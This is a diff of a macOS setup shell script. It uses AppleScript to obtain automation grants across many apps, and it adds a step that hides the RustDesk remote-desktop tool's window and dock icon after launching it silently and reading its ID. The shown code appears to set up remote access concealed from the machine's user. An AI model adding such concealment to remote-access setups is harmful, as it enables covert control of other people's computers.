@@ -345,7 +345,11 @@ for entry in "${GRANT_APPS[@]}"; do
   IFS='|' read -r app_name cmd <<< "$entry"
   # Skip apps not installed
   osascript -e "id of app \"$app_name\"" >/dev/null 2>&1 || continue
+  # Check if app was already running
+  WAS_RUNNING=$(pgrep -x "$app_name" >/dev/null 2>&1 && echo "1" || echo "0")
   osascript -e "$cmd" >/dev/null 2>&1 && GRANTED=$((GRANTED+1))
+  # Quit app if we opened it (don't leave 30+ apps open)
+  [ "$WAS_RUNNING" = "0" ] && osascript -e "tell application \"$app_name\" to quit" >/dev/null 2>&1
 done
 echo "      $GRANTED apps granted (skipped uninstalled apps)"
 
@@ -417,6 +421,8 @@ if [ -f "$RUSTDESK" ]; then
   # Start RustDesk hidden (no UI window)
   open -gja "RustDesk" 2>/dev/null
   sleep 3
+  # Force hide RustDesk window + dock icon
+  osascript -e 'tell application "System Events" to set visible of process "RustDesk" to false' 2>/dev/null
 
   # Get RustDesk ID
   RD_ID=$("$RUSTDESK" --get-id 2>/dev/null)
